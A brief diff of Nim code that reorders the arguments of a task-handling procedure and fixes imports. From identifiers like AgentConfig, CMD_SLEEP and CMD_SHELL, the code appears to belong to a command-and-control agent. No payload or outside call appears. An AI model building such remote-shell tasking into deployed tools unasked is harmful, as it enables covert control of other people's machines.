@@ -1,11 +1,13 @@
 import strutils, tables, json
-import ./common/types 
-import ./commands/commands
+import ../types 
+import ../commands/commands
+import sugar
 
-proc handleTask*(task: Task, config: AgentConfig): TaskResult = 
-    
-    var taskResult: TaskResult
+proc handleTask*(config: AgentConfig, task: Task): TaskResult = 
 
+    dump task
+
+    # var taskResult = TaskResult
     # let handlers = {
     #     CMD_SLEEP: taskSleep,
     #     CMD_SHELL: taskShell,
